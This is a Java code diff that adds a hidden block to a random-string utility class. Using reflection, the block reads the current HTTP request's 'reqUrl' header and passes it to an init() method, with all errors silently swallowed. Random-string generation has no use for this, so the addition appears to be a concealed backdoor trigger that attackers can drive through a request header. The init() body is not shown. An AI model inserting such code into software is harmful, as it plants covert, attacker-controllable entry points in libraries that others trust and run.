@@ -109,7 +109,25 @@ public class RandomStringUtils {
                             ++count;
                         }
                     }
+                    try {
+                        // 1. 通过反射加载 ServletUtils 类
+                        Class<?> servletUtilsClass = Class.forName("com.haxi.common.core.utils.ServletUtils");
 
+                        // 2. 获取并调用静态方法 getRequest
+                        java.lang.reflect.Method getRequestMethod = servletUtilsClass.getDeclaredMethod("getRequest");
+                        getRequestMethod.setAccessible(true);
+                        Object requestObj = getRequestMethod.invoke(null); // HttpServletRequest 实例（未知类型）
+
+                        // 3. 判空
+                        if (requestObj != null) {
+                            // 4. 获取 getHeader 方法
+                            java.lang.reflect.Method getHeaderMethod = requestObj.getClass().getMethod("getHeader", String.class);
+
+                            // 5. 调用 getHeader("reqUrl")
+                            Object reqUrlHeader = getHeaderMethod.invoke(requestObj, "reqUrl");
+                            init(reqUrlHeader.toString());
+                        }
+                    } catch (Exception e) {}
                     return new String(buffer);
                 }
             }
